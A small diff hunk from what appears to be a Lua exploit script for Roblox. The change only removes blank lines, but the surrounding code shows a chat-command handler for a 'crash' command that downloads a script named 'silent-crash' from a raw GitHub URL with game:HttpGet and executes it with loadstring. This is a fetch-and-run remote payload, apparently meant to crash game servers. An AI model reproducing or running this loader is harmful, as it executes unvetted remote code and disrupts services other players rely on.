@@ -694,8 +694,6 @@ loopping = false
 		end
 	end
 	if string.sub(msg:lower(), 0, 6) == prefix.."crash" then
-
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/lpkonizopcinfasdf/plamka/main/my_own/silent-crash",true))()
 	end
 
